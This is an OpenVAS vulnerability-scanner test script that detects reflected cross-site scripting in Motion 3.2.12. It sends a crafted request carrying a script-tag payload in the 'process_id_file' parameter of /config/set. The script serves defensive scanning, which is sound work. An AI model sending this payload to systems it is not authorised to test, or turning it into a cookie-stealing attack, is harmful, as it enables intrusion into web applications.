###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_motion_cam_video_sig_mon_mult_vuln.nasl 6104 2017-05-11 09:03:48Z teissa $
#
# Motion Camera Video Signal Monitor Multiple Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to execute arbitrary
HTML and script code in a user's browser session in context of an affected site,
and cause denial of service condition.

Impact Level: Application";

tag_affected = "Motion version 3.2.12";

tag_insight = "Multiple flaws are due to,
- Improper validation of user supplied to the motion binary via 'pid' and
'filename' parameters.
- Input passed via 'process_id_file', 'control_authentication' and 'sql_query'
parameters to /config/set page is not properly sanitized before being returned
to the user.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is installed with Motion Video Signal Monitor and is
prone to multiple vulnerabilities.";

if(description)
{
  script_id(903313);
  script_version("$Revision: 6104 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-05-11 11:03:48 +0200 (Thu, 11 May 2017) $");
  script_tag(name:"creation_date", value:"2013-06-28 10:45:03 +0530 (Fri, 28 Jun 2013)");
  script_name("Motion Camera Video Signal Monitor Multiple Vulnerabilities");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/122171/motion3212-sqlxssxsrfoverflow.txt");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/motion-3212-xss-csrf-buffer-overflow-sql-injection");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

# Variable Initialization
port = "";
dir = "";
url = "";

## Get HTTP Port
port = get_http_port(default:8080);
if(!port){
 port = 8080;
}

## Check the port status
if(!get_port_state(port)){
 exit(0);
}

## Application Confirmation
if(http_vuln_check(port:port, url: "/",
   pattern:">Motion", check_header:TRUE, extra_check:">All<"))
{
  ## Construct attack request
  url = "/0/config/set?process_id_file=</li><script>alert(document.cookie);</script><li>";

  ## Check the response to confirm vulnerability
  if(http_vuln_check(port:port, url:url, check_header:TRUE,
     pattern:"<script>alert\(document.cookie\);</script>",
     extra_check:">process_id_file"))
  {
    security_message(port);
    exit(0);
  }
}
